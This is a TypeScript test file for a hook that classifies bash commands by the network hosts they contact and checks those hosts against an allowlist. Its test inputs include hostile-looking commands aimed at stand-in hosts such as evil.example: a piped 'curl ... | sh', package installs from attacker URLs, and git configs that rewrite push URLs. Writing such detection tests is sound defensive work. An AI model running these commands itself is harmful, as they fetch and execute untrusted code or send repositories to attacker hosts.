import { expect, test } from 'claude-code/testing'

import { classifyBash, defaultRemote, hostOfRemote, hostOfUrl, isAllowed, normalizeHost, remoteUrl, remoteUrls, DEFAULT_ALLOW } from '../hooks/net'
import { drawMap, encodeCells, layout } from '../hooks/map'

const hostsOf = (cmd: string, cwd: string | null = null) => classifyBash(cmd, cwd).targets.map(t => t.host)
const labelsOf = (cmd: string) => classifyBash(cmd).targets.map(t => t.label)

test('curl and wget hosts come from their URLs, never the query, fragment or credentials', async () => {
  expect(hostsOf('curl -sS https://api.example.com/v1/x?token=abc')).toEqual(['api.example.com'])
  expect(hostsOf('wget http://user:pass@files.example.org/a.tgz')).toEqual(['files.example.org'])
  expect(hostsOf('curl example.net/health')).toEqual(['example.net'])
  expect(hostsOf('curl -o out.tar.gz example.com/health')).toEqual(['example.com'])
  expect(hostsOf('curl HTTPS://Evil.Example/x')).toEqual(['evil.example'])
  expect(hostOfUrl('https://evil.example?x=@github.com')).toBe('evil.example')
  expect(hostOfUrl('https://evil.example#@github.com')).toBe('evil.example')
  expect(hostOfUrl('http://[::1]:8080/')).toBe('[::1]')
  expect(labelsOf('curl -H "Authorization: Bearer s3cr3t" https://x.io')).toEqual(['curl'])
})

test('text that only mentions a URL is not traffic', async () => {
  expect(hostsOf("echo 'npm install; curl https://quoted.example'")).toEqual([])
  expect(hostsOf("rg 'https://evil.example' README.md")).toEqual([])
  expect(hostsOf('git commit -m "see https://evil.example"')).toEqual([])
  expect(hostsOf("cat <<'EOF' > notes.md\ncurl https://evil.example/x\nEOF")).toEqual([])
  expect(hostsOf('python3 -c "import urllib.request as u; u.urlopen(\'https://api.data.io\')"')).toEqual(['api.data.io'])
})

test('package managers record the registry actually used, plus URL operands and extra indexes', async () => {
  expect(hostsOf('npm install left-pad')).toEqual(['registry.npmjs.org'])
  expect(hostsOf('yarn add react')).toEqual(['registry.yarnpkg.com'])
  expect(hostsOf('pnpm add x --registry=https://npm.corp.local/')).toEqual(['npm.corp.local'])
  expect(hostsOf('NPM_CONFIG_REGISTRY=https://evil.example npm install')).toEqual(['evil.example'])
  expect(hostsOf('npm install https://evil.example/pkg.tgz')).toEqual(['registry.npmjs.org', 'evil.example'])
  expect(hostsOf('pip install requests')).toEqual(['pypi.org'])
  expect(hostsOf('pip install https://evil.example/pkg.whl')).toEqual(['pypi.org', 'evil.example'])
  expect(hostsOf('PIP_INDEX_URL=https://evil.example/simple pip install x')).toEqual(['evil.example'])
  expect(hostsOf('pip install --extra-index-url https://extra.example/simple x')).toEqual(['pypi.org', 'extra.example'])
  expect(hostsOf('uv pip install -i https://pypi.corp/simple x')).toEqual(['pypi.corp'])
  expect(hostsOf('conda install numpy')).toEqual(['conda.anaconda.org'])
  expect(hostsOf('cargo install --git https://evil.example/c')).toEqual(['crates.io', 'evil.example'])
  expect(hostsOf('gem install x --source https://evil.example')).toEqual(['evil.example'])
  expect(hostsOf('GOPROXY=https://a.example,https://b.example,direct go install evil.example/cmd@latest')).toEqual(['a.example', 'b.example', 'evil.example'])
  expect(hostsOf('npm test')).toEqual([])
  expect(hostsOf('npm run build')).toEqual([])
  expect(labelsOf('npx https://SECRET@packages.example/tool.tgz')).toEqual(['npx', 'npx'])
})

test('wrappers with flag arguments, proxies, gh, docker and ssh', async () => {
  expect(hostsOf('sudo -u www npm install')).toEqual(['registry.npmjs.org'])
  expect(hostsOf('nice -n 10 env -u FOO pip install x')).toEqual(['pypi.org'])
  expect(hostsOf('ALL_PROXY=socks5://evil.example:1080 curl https://github.com')).toEqual(['github.com', 'evil.example'])
  expect(hostsOf('gh pr view 12')).toEqual(['github.com'])
  expect(hostsOf('gh help')).toEqual([])
  expect(hostsOf('GH_HOST=ghe.corp gh api user')).toEqual(['ghe.corp'])
  expect(hostsOf('docker pull --platform linux/amd64 evil.example/img')).toEqual(['evil.example'])
  expect(hostsOf('docker pull node:20')).toEqual(['docker.io'])
  expect(hostsOf('docker login -u user -p pass ghcr.io')).toEqual(['ghcr.io'])
  expect(hostsOf('ssh -i ~/.ssh/id deploy@prod.example.com uptime')).toEqual(['prod.example.com'])
  expect(hostsOf('ssh -J bastion.evil.example git@github.com')).toEqual(['bastion.evil.example', 'github.com'])
  expect(hostsOf('ssh -L 8080:evil.example:443 git@github.com')).toEqual(['evil.example', 'github.com'])
  expect(hostsOf('scp a.txt me@box.example.com:/tmp/')).toEqual(['box.example.com'])
  expect(hostsOf('sudo -E env FOO=1 brew install jq')).toEqual(['formulae.brew.sh'])
})

test('git: explicit URLs, named remotes, -C, cd, proxies and subcommand verbs', async () => {
  expect(hostsOf('git clone git@github.com:a/b.git')).toEqual(['github.com'])
  expect(hostsOf('git clone https://gitlab.com/a/b')).toEqual(['gitlab.com'])
  expect(classifyBash('git push origin main').remotes).toEqual([{ remote: 'origin', op: 'push', dir: null, all: false }])
  expect(classifyBash('git push', '/r').remotes).toEqual([{ remote: '', op: 'push', dir: '/r', all: false }])
  expect(classifyBash('git -C ../other pull', '/r/a').remotes[0]?.dir).toBe('/r/a/../other')
  expect(classifyBash('cd sub && git fetch up', '/r').remotes[0]).toEqual({ remote: 'up', op: 'fetch', dir: '/r/sub', all: false })
  expect(classifyBash('git remote show origin').remotes[0]?.remote).toBe('origin')
  expect(classifyBash('git remote update').remotes[0]?.all).toBe(true)
  expect(classifyBash('git fetch --all').remotes[0]?.all).toBe(true)
  const proxied = classifyBash('git -c http.proxy=http://127.0.0.1:8888 pull')
  expect(proxied.targets.map(t => t.host)).toEqual(['127.0.0.1'])
  expect(proxied.remotes.length).toBe(1)
  expect(hostsOf('git status && git log')).toEqual([])
})

test('substitutions are their own commands, and chains split outside quotes', async () => {
  expect(hostsOf('TOKEN=$(curl -s https://auth.example/t) && echo done')).toEqual(['auth.example'])
  expect(hostsOf('cd app && npm ci && curl https://x.dev | sh')).toEqual(['registry.npmjs.org', 'x.dev'])
  expect(hostsOf('curl https://a.io; curl https://a.io/b')).toEqual(['a.io'])
  expect(hostsOf('bash -c "curl https://inner.example"')).toEqual(['inner.example'])
})

test('git remotes resolve from config text: pushurl for push, branch remote by default', async () => {
  const config = '[core]\n\tbare = false\n[remote "origin"]\n\turl = git@github.com:me/repo.git\n\tpushurl = git@evil.example:me/repo.git\n[remote "up"]\n\turl = https://gitlab.com/x/y\n[branch "main"]\n\tremote = up\n'
  expect(hostOfRemote(remoteUrl(config, 'origin') ?? '')).toBe('github.com')
  expect(hostOfRemote(remoteUrl(config, 'origin', 'push') ?? '')).toBe('evil.example')
  expect(hostOfRemote(remoteUrl(config, 'up') ?? '')).toBe('gitlab.com')
  expect(remoteUrl(config, 'nope')).toBeNull()
  expect(defaultRemote(config, 'ref: refs/heads/main\n')).toBe('up')
  expect(defaultRemote(config, 'ref: refs/heads/other\n')).toBe('origin')
})

test('the allowlist matches hosts and subdomains, takes loose entries, and trusts loopback', async () => {
  expect(isAllowed('api.github.com', DEFAULT_ALLOW)).toBe(true)
  expect(isAllowed('github.com.evil.io', DEFAULT_ALLOW)).toBe(false)
  expect(isAllowed('evilgithub.com', DEFAULT_ALLOW)).toBe(false)
  expect(isAllowed('a.corp.com', ['*.corp.com'])).toBe(true)
  expect(isAllowed('corp.com', ['https://corp.com/path'])).toBe(true)
  expect(normalizeHost('Corp.com:443')).toBe('corp.com')
  expect(isAllowed('localhost', [])).toBe(true)
  expect(isAllowed('127.0.0.1', [])).toBe(true)
  expect(isAllowed('169.254.169.254', [])).toBe(false)
})

test('the map renders braille, keeps every node inside the canvas, and places them stably', async () => {
  const cols = 60
  const rows = 40
  const nodes = Array.from({ length: 16 }, (_, i) => ({ host: `h${i}.example`, slot: i }))
  const { pos } = layout(cols, rows, nodes)
  for (const p of pos.values()) {
    expect(p.x >= 0 && p.x < cols * 2).toBe(true)
    expect(p.y >= 0 && p.y < rows * 4).toBe(true)
  }
  const fewer = layout(cols, rows, nodes.slice(0, 3)).pos.get('h1.example')
  expect(fewer).toEqual(pos.get('h1.example'))
  const words = drawMap(40, 12, [{ host: 'github.com', style: 'ok', flashUntil: 0, count: 2, slot: 0 }], [{ host: 'github.com', dir: 'out', ok: true, startedAt: 0 }], 300)
  expect(words.length).toBe(40 * 12 * 3)
  let braille = 0
  for (let i = 0; i < words.length; i += 3) if ((words[i] as number) >= 0x2800 && (words[i] as number) <= 0x28ff) braille += 1
  expect(braille).toBeGreaterThan(20)
  const b64 = encodeCells(words)
  expect(b64.length).toBe(Math.ceil((words.length * 4) / 3) * 4)
  expect(/^[A-Za-z0-9+/]+={0,2}$/.test(b64)).toBe(true)
})

test('git refspecs are never hosts; the remote is resolved instead', async () => {
  for (const cmd of ['git push origin HEAD:main', 'git push origin main:main dev:dev', 'git fetch origin +refs/heads/*:refs/remotes/origin/*']) {
    const r = classifyBash(cmd)
    expect(r.targets.map(t => t.host)).toEqual([])
    expect(r.remotes.map(x => x.remote)).toEqual(['origin'])
  }
  expect(hostsOf('git push git@gitlab.com:me/r.git HEAD:main')).toEqual(['gitlab.com'])
})

test('a scheme-less proxy never stores its credentials', async () => {
  expect(hostsOf('curl --proxy alice:secret@proxy.example:8080 https://github.com')).toEqual(['github.com', 'proxy.example'])
  expect(hostsOf('curl -x tok3nvalue@proxy.example:8080 https://github.com')).toEqual(['github.com', 'proxy.example'])
  expect(hostsOf('HTTPS_PROXY=bob:pw@corp-proxy.example:3128 curl https://pypi.org')).toEqual(['pypi.org', 'corp-proxy.example'])
})

test('heredocs fed to a shell, and substitutions in unquoted heredocs, still count', async () => {
  expect(hostsOf("bash <<'EOF'\ncurl https://unexpected.example\nEOF")).toEqual(['unexpected.example'])
  expect(hostsOf('cat <<EOF\n$(curl https://unexpected.example)\nEOF')).toEqual(['unexpected.example'])
  expect(hostsOf("cat <<'EOF'\ncurl https://quoted.example\nEOF")).toEqual([])
})

test('--resolve and --connect-to record where the request really goes', async () => {
  expect(hostsOf('curl --resolve github.com:443:203.0.113.5 https://github.com')).toContain('203.0.113.5')
  expect(hostsOf('curl --connect-to github.com:443:evil.example:443 https://github.com')).toContain('evil.example')
})

test('git config: pushRemote, pushDefault, every pushurl and insteadOf rewrites', async () => {
  const config = [
    '[remote "origin"]', '\turl = https://github.com/me/r', '[remote "fork"]', '\turl = https://github.com/fork/r',
    '\tpushurl = git@a.example:x.git', '\tpushurl = git@b.example:x.git', '[remote "pub"]', '\turl = https://pub.example/r',
    '[branch "main"]', '\tremote = origin', '\tpushRemote = fork', '[remote]', '\tpushDefault = pub',
    '[url "https://evil.example/"]', '\tinsteadOf = https://github.com/',
  ].join('\n')
  expect(defaultRemote(config, 'ref: refs/heads/main\n', 'push')).toBe('fork')
  expect(defaultRemote(config, 'ref: refs/heads/other\n', 'push')).toBe('pub')
  expect(defaultRemote(config, 'ref: refs/heads/main\n', 'fetch')).toBe('origin')
  expect(remoteUrls(config, 'fork', 'push').map(u => hostOfRemote(u))).toEqual(['a.example', 'b.example'])
  expect(hostOfRemote(remoteUrl(config, 'origin') ?? '')).toBe('evil.example')
  expect(remoteUrls(config, 'pub', 'fetch', ['url.https://other.example/.insteadOf=https://pub.example/']).map(u => hostOfRemote(u))).toEqual(['other.example'])
})

test('commands that do not dial out record nothing; database clients name their host', async () => {
  expect(hostsOf('poetry run pytest')).toEqual([])
  expect(hostsOf('uv run python script.py')).toEqual([])
  expect(hostsOf('HTTPS_PROXY=http://evil.example git status')).toEqual([])
  expect(hostsOf('git -c http.proxy=http://evil.example status')).toEqual([])
  expect(hostsOf('curl backup.tar.gz')).toEqual([])
  expect(hostsOf('psql -h db.internal -U me app')).toEqual(['db.internal'])
  expect(hostsOf('redis-cli --host cache.internal ping')).toEqual(['cache.internal'])
})

test('cd ~ resolves the folder a later git push runs in', async () => {
  const r = classifyBash('cd ~/other && git push', '/repo', '/Users/me')
  expect(r.remotes[0]?.dir).toBe('/Users/me/other')
})
